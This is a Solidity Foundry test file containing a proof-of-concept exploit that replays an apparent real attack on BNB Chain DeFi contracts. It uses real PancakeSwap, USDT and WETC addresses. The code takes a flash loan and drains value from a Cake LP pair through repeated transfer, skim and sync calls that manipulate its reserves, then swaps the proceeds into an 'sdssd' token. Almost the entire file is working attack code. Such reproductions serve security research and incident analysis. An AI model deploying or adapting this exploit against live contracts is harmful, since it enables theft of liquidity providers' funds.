
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 54333337;
    uint256 constant TX_TIMESTAMP = 1752747886;
    uint256 constant TX_BLOCK_NUMBER = 54333338;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attack_contract, attack, Addresses.sdssd, "sdssd", 99999011300001196359);
    }
}

contract OurAttack {




    function attack() external payable {
        _attack();
    }

    function _callback() internal {
        _markCallback(0);
        {
            Harness.vmExt().startPrank(address(this));
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_D0E3, 250000000000000000002000);

            Harness.vmExt().stopPrank();
        }
    }

    function flashCallback() internal {
        _markCallback(1);
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(250000000000000000000000, _addressArray2(Addresses.USDT, Addresses.WETC));
        IUniswapV2PairLike(Addresses.Cake_LP_D0E3)
            .swap(
                1000,
                6994607918395778704138079,
                address(this),
                hex"0000000000000000000000000000000000000000000034f086f3b33b68400000"
            );
        IERC20Like(Addresses.WETC).balanceOf(address(this));
        IERC20Like(Addresses.WETC).balanceOf(Addresses.Cake_LP_D0E3);
        uint256 wetcTransferAmount = 3533285263192068394666304;
        IERC20Like(Addresses.WETC).transfer(Addresses.Cake_LP_D0E3, wetcTransferAmount);
        ICake_LP_D0E3(Addresses.Cake_LP_D0E3).skim(Addresses.Mall);
        IERC20Like(Addresses.WETC).balanceOf(Addresses.Cake_LP_D0E3);
        ICake_LP_D0E3(Addresses.Cake_LP_D0E3).sync();
        IERC20Like(Addresses.WETC).balanceOf(Addresses.Cake_LP_D0E3);
        uint256 wetcTransferAmount_2 = 27354466553745045636126;
        IERC20Like(Addresses.WETC).transfer(Addresses.Cake_LP_D0E3, wetcTransferAmount_2);
        ICake_LP_D0E3(Addresses.Cake_LP_D0E3).skim(Addresses.Mall);
        ICake_LP_D0E3(Addresses.Cake_LP_D0E3).sync();
        uint256 wetcBalanceOfAttackAttackContract = IERC20Like(Addresses.WETC).balanceOf(address(this));
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(3433968188649965263835649, _addressArray2(Addresses.WETC, Addresses.USDT));
        {
            Harness.vmExt().startPrank(address(this));
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_D0E3, 10000);

            Harness.vmExt().stopPrank();
        }
        uint256 wetcBalanceOfAttackAttackContract_2 = IERC20Like(Addresses.WETC).balanceOf(address(this));
        IERC20Like(Addresses.WETC).transfer(Addresses.Cake_LP_D0E3, wetcBalanceOfAttackAttackContract_2);
        IUniswapV2PairLike(Addresses.Cake_LP_D0E3).swap(351495403570120114936199, 0, address(this), hex"");
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.sdssd).balanceOf(address(this));
        uint256 usdtApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, usdtApproveAllowance);
        {
            if (101395403570120114925199 != 0) {
                IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, 101395403570120114925199);
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        101395403570120114925199,
                        0,
                        _addressArray2(Addresses.USDT, Addresses.sdssd),
                        address(this),
                        1752748086
                    );
            }
        }
        IERC20Like(Addresses.sdssd).balanceOf(address(this));
        uint256 transferLiveAmount = 1000100000000000000000000;
        IERC20Like(Addresses.USDT).transfer(Addresses.A_92B780_3121, transferLiveAmount);
    }

    function _attack() internal {
        Harness.vmExt()
            .store(Addresses.attack_contract, bytes32(uint256(7)), bytes32(uint256(1000000000000000000000000)));
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(4)),
                bytes32(uint256(1324155132528636113958891284962698007644378421159))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(3)),
                bytes32(uint256(811675094830879013437427729271309093747086250211))
            );
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000001);
            IContract_92B780_3121(Addresses.A_92B780_3121)
                .flash(address(this), 1000000000000000000000000, 0, flashProof);
        }
    }

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x84800812) {
            _callback();
            return;
        }
        if (msg.sig == 0xe3b872d3) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP = 0x119D1777d617FC70f6b063990eEDc2B9c87a7475;
    address internal constant A_419D7E_DE49 = 0x419D7E35CAA34487a575dEc6C7aB74699b6BDe49;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant GnosisSafeProxy = 0x78bb09F285fa0b4005E131124175F50627347a5a;
    address internal constant attacker_eoa = 0x7e7C1f0D567c0483f85e1d016718E44414CdBAFE;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant Cake_LP_D0E3 = 0x8e2cc521b12dEBA9A20EdeA829c6493410dAD0E3;
    address internal constant A_92B780_3121 = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address internal constant sdssd = 0x96928300ed3b68b8ED25C293e225c8d9C1a79E18;
    address internal constant attack_contract = 0xAf68EFB3c1e81AAD5cDb3D4962C8815FB754c688;
    address internal constant Mall = 0xB213171c9a803997B44842d0361e742e1E6691fc;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant WETC = 0xE7f12B72bfD6E83c237318b89512B418e7f6d7A7;
}

interface ICake_LP_D0E3 {
    function skim(address) external;
    function sync() external;
}

interface IContract_92B780_3121 {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IPancakeRouter {
    function getAmountsOut(uint256, address[] calldata) external view;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
